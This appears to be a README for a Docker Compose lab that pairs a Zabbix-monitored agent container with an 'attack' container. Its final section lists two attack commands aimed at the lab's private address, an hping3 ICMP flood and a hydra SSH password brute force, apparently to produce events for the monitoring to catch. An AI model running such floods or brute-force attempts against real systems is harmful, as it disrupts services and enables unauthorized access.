# zabbix-monitoring-docker-compose
## Installation
To run My Project, simply run the following command:
```bash
docker-compose up -d 
```
## Next execute agenttest
```bash
docker exec --user root -it agenttest /bin/bash
```
## In the agenttest host terminal, configure as follows:
```bash
echo "Hostname=AgentTest" >> /etc/zabbix/zabbix_agentd.conf
usermod -aG adm zabbix
service rsyslog start
service zabbix-agent start
```
## To execute the attack scenarios, use the following commands:
```bash
# Execute attack host
docker exec --user root -it attack /bin/bash
```
#### In the attack host terminal, use the following commands:
```bash
hping3 --flood --icmp -c 300000 172.16.238.150
hydra -L /home/htt/usernames.txt -P /home/htt/passwords.txt ssh://172.16.238.150
```